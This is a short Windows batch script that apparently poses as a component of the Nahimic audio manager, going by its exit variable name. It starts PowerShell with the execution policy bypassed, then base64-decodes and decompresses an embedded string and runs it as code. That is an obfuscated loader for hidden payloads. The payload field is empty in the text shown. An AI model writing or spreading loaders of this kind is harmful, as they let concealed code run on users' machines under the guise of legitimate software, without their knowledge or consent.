@echo off
setlocal EnableExtensions DisableDelayedExpansion
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$z='';$i=[IO.MemoryStream]::new([Convert]::FromBase64String($z));$d=[IO.Compression.DeflateStream]::new($i,[IO.Compression.CompressionMode]::Decompress);$o=[IO.MemoryStream]::new();$d.CopyTo($o);&([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($o.ToArray())))"
set "NAHIMIC_MANAGER_EXIT=%ERRORLEVEL%"
endlocal & exit /b %NAHIMIC_MANAGER_EXIT%
